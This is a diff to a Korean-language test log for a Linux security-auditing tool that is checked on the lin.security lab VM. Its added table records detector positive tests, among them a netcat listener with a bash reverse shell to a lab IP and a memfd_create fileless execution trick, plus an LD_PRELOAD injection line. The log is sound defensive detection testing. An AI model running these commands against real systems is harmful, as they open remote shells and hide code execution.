@@ -150,6 +150,22 @@ SUID·SGID 파일 39개, 모두 패키지 소속. 그중 둘은 패키지가 SUI
 | `LD_PRELOAD=/tmp/.l/libh.so sleep` | PRC-07 위험 일치 |
 | `tcpdump -i enp0s3` | PRC-06·NET-06 위험 일치 (root 그대로 실행) |
 
+
+## 20차 적용 — 2-B 보정 (`84da293`, 2026-11-06)
+
+기준선(`original`): 탐지 10건 — 1·2단계 탐지와 같음 (권한 상승 경로 7 / 7). **NET-01 오탐 0건**:
+- 점검 범위 "리스닝 소켓 31개 — … tcp/2049(커널 nfsd), tcp/34639(커널 lockd), tcp/38263(커널 lockd) … 커널 NFS 소켓 8개"
+- 2-B 10개 항목 탐지 없음. PRC-05 /proc 105개·ps 106개
+
+양성 (root 셸, 한 줄씩):
+
+| 시험 | 기대 | 결과 |
+| --- | --- | --- |
+| `nc -lnv 4444` + `bash -i >& /dev/tcp/192.168.56.106/4444 0>&1` | PRC-08 심각, NET-01 위험, NET-02 위험 2건 | 일치 — PRC-08 bash fd 0·1·2 → 192.168.56.106:4444, NET-01 nc.openbsd, NET-02 bash "나가는 연결(상대 192.168.56.106:4444)"·nc "들어온 연결(4444번 포트 ← 192.168.56.106:55626)" |
+| ctypes `syscall(319)`(memfd_create) + `execv('/proc/self/fd/3')` | PRC-02 심각 | 일치 — "PID 17609 '3'(명령줄 sleep 3600)", memfd:payload, comm 근거 "파일 설명자 경로로 실행한 흔적 (fexecve)" |
+
+19차의 PRC-04·06·07, NET-06 결과와 합쳐 lin.security에서 재현 가능한 2-B 양성 모두 일치. 이후 `original` 복원.
+
 ## 2차 적용 (같은 날, 커밋 58982a3)
 
 구현 항목 ACC-01, ACC-06. 첫 실행은 새 버전을 복사하기 전이라 측정에서 제외했다.
@@ -457,3 +473,5 @@ lin.security 권한 상승 경로: 1단계 6개 + 2-A에서 찾은 peter docker 
 21. 18차 적용 도구 실행 1회 (`sudo /bin/bash -c`)
 22. 2-B 정답 확인 `sudo /bin/bash` 셸 1회 (`ss`, `/proc/*/exe·cmdline·environ·fd`, `ps`, `/sys/class/net`)
 23. 19차 적용 `sudo /bin/bash` 셸 1회 (도구 2회, nc·sleep·tcpdump 실행). 이후 스냅샷 복원
+24. NFS 정답 확인 (bob, `/proc/fs/nfsd/portlist`, `nlm_*port`, `rpcinfo`, `ss`)
+25. 20차 적용 `sudo /bin/bash` 셸 1회 (도구 2회, nc·bash·python 실행). 이후 스냅샷 복원
